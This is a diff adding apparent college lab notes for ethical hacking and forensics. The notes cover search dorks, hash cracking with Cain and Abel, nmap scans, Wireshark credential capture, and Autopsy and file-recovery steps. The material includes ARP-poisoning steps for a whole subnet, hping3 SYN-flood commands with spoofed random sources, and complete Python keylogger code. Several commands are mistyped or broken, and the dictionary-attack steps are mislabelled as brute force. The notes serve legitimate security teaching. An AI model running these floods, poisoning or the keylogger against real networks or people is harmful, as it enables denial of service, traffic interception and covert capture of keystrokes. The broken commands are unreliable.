@@ -1,0 +1,210 @@
+Practical - 1
+
+intitle:"shibu inu"
+inurl:"amazon.com"
+site:economictimes.indiatimes.com"shiba inu"
+filetype:pdf"Superman"
+inurl and intext
+intitle and intext
+
+WhoIs
+who is -v www.twitter.com
+
+
+Practical - 2a
+
+1. start cryptool
+2. write something in the default file open
+3. go to encrypt/decrypt
+4. go to symmetric classic for ceaser
+5. go to symmetric modern for rc4
+
+for bruteforce analysis
+1. write something in the default file open
+2. go to symmetric modern for rc4
+3. encrypt the file
+4. then go to analysis
+5. selection key for modern, rc4, then select bits length then start
+6. Select the file with the text in it and show
+
+
+Practical - 2b
+
+MD5 algorithm and decode the same in Cain and Able tool
+1. Open Cain and Able and select the encrypt option in the menu.
+2. Encrypt the text and copy the MD5 hash
+3. Select “Cracker” in the menu bar and select “MD5 Hashes” in the side menu
+4. Right click and select “Add to list”, add the hash in the list to crack.
+5. Right click on the added hash and select “brute force attack”
+6. Adjust the password length and other parameters and click start
+That’s it, the hash is now cracked by using brute force attack.
+
+dictionary attack in Cain and Able on a text encrypted by MD5
+1. Open Cain and Able and select the encrypt option in the menu.
+2. Encrypt the text and copy the MD5 hash
+3. Select “Cracker” in the menu bar and select “MD5 Hashes” in the side menu
+4. Right click and select “Add to list”, add the hash in the list to crack.
+5. Right click on the added hash and select “Dictionary Attack”
+6. In the file section, right click and add file present in, Program Files x86-> Cain -> Wordlists -> Wordlists.txt
+7. Click on start
+That’s it, the hash is now cracked by using brute force attack.
+
+Encrypt and decrypt a SHA-2 Hash
+1. Open Cain and Able and select the encrypt option in the menu.
+2. Encrypt the text and copy the SHA hash
+3. Select “Cracker” in the menu bar and select “SHA2 Hashes” in the side menu
+4. Right click and select “Add to list”, add the hash in the list to crack.
+5. Right click on the added hash and select “brute force attack”
+6. Adjust the password length and other parameters and click start
+
+encrypt and Decrypt a MD4 Hash
+1. Open Cain and Able and select the encrypt option in the menu.
+2. Encrypt the text and copy the MD4 hash
+3. Select “Cracker” in the menu bar and select “MD4 Hashes” in the side menu
+3. Right click and select “Add to list”, add the hash in the list to crack.
+5. Right click on the added hash and select “brute force attack”
+6. Adjust the password length and other parameters and click start
+
+Encrypt and Decrypt a SHA1 hash using Dictionary attack
+1. Open Cain and Able and select the encrypt option in the menu.
+2. Encrypt the text and copy the SHA1 hash
+3. Select “Cracker” in the menu bar and select “SHA1 Hashes” in the side menu
+4. Right click and select “Add to list”, add the hash in the list to crack.
+5. Right click on the added hash and select “Dictionary Attack”
+6. In the file section, right click and add file present in, Program Files x86-> Cain -> Wordlists -> Wordlists.txt
+7. Click on start
+That’s it, the hash is now cracked by using brute force attack.
+
+
+Practical - 3a
+
+ipconfig
+ping 127.0.0.1
+ping kccollege.edu.in
+netstat
+netstat -r
+tracert h 20 kccollege.edu.in
+
+
+Practical - 3b
+
+1. Start the sniffer. Click on Sniffer tab-> Start/Stop sniffer button in toolbar.
+2. Add hosts to the list by clicking on the blue cross button. Select “All hosts in my subnet” and proceed. All connected hosts will appear. Then click on APR in the bottom toolbar.
+3. After the above screen appears, click on the blue cross button to add a new ARP Poisoning router to the list. Select the default gateway and select all hosts and press Ok.
+4. Now click on the APR Logo and start the poisoning
+
+
+Practical - 4
+
+run on cmd
+1. nmap -p 1-65535 localhost (-p: portname)
+2. nmap -p 80433 (specific port)
+3. nmap -O -F localhost (-O: OS detection, -F: fast mode)
+4. nmap -A localhost 
+5. nmap - -open localhost (open port scanning)
+6. nmap -F -sS localhost (stealthy scan)
+7. nmap -sF localhost (TCP FIN)
+8. nmap -F -A T4 localhost
+9. nmap -sS (-sS SYN)
+10. nmap -sX localhost (Xmas Scan)
+11. nmap -sT localhost (TCP scan)
+10. nmap -sP 198.160.1.12/24
+
+
+Practical - 5a
+
+1. Open your internet browser
+2. Clear browser cache
+3. Open Wireshark
+3. Choose the proper interface
+4. Click onthe Start button to start capturing traffic via this interface
+5. Visit the URL that you wanted to capture the traffic from
+http://testphp.vulnweb.com/login.php
+6. Enter the email address and other details in the form
+7. Go back to wireshark screen and stop capturing by clicking on the red button
+tcp
+arp
+icmp
+udp
+http
+http.request.method=="POST"
+8. Click on the package visible and click on follow and tcp stream
+
+
+Practical - 5b
+
+1. Open virtual machine
+2. Open windows
+3. Find the ip address using the ipconfig command on the command prompt
+ipconfig
+4. Open kali linux
+5. Open wireshark
+6. open terminal and type
+7. hping3 -c 100000 --rand-source
+8. hping3 -c 100000 --rand-source 192.168.1.9
+9. hping3 –c 100 –d 120 –S w 64 –p 21 --flood --rand-source 192.168.1.60
+
+
+Practical - 6
+
+1.create a python file
+2.copy paste the code
+from pynput.keyboard import Key, Listener
+import logging
+log_dir = r"F:/admin/Key Logging"
+logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+def on_press(key):
+	logging.info(str(key))
+with Listener(on_press=on_press) as listener:
+	listener.join()
+3. Change the path accordingly to where you want the result to be stored and run
+4. if pynput not installed then "pip install pynput"
+
+
+Practical - 7
+
+Creating Forensic Image
+1. Click File, and then Create Disk Image, or click the button on the tool bar.
+2. Select the source you want to make an image of and click Nex
+3. Select the drive or browse to the source of the image you want, and then click Finish.
+5. Select the type of image you want to create, and then click Next.
+6. In the Image Destination Folder field, type the location path where you want to save the image file, or click Browse to find to the desired location.
+9. Click Finish. You return to the Create Image dialog.
+12. After the images are successfully created, click Image Summary to view detailed file
+
+Analyzing forensic image
+1) Click on Add Evidence Item to add evidence from disk, image file or folde
+2) Now select the source evidence type as physical drive, logical drive or image file. We have selected image file and click on next.
+3) Select virtual drive image & click on open option. Select the source path and click on finish
+4) Now select Evidence Tree and analyse the virtual disk as physical disk.
+
+
+Practical - 8
+
+1. Start Autopsy and select New Case
+2. Enter Case Information and Base Directory and Click on Finish
+3. Select the type of Data Source that has to be added
+4. Select Data Source (Here, a preexisting folder that has been selected)
+5. Select All Ingest Modules
+6. Wait for the data source to process and be added to local database. Click Finis
+7. Now Autopsy Window will appear and it will analyze the files that we have selected
+8. All Files will appear in table tab, select any file to see the data
+9. Expand the tree from the left side panel to view the files and then expand the deleted files node
+10. To recover the file, go to view node->Deleted files node, here select any file and right click on it, then select Extract Files option
+11. By default folder is chosen to save the recovered file
+12. Now go to the folder, and view the recovered file
+13. Click on Generate report from autopsy window and select the Excel format and click on next
+14. Click finish after selecting all results
+15. Now report is generated so click on the close button. We can see the report on the report node, Double click on the excel file and open it to view the report
+
+
+Practical - 9
+
+1. Create a folder wherein files would be placed which would be deleted for recovery thereafter.
+2. Start the EaseUS Data recovery Wizard and select the type of file to be scanned for recovery.
+3. Then select the drive or location from where we want to recover the data and click on scan.
+4. A quick scan will be started which will be completed soon.
+5. The quick scan results will show the files deleted recently and prompts the user for a deep scan. Locate the file we want to recover and click on the recover button.
+6. Browse and select the folder where we want to store the recovered data.
+7. The recovery will be completed after clicking on ok.
+8. We can check the folder for the recovered file and try to open it for integrity check.
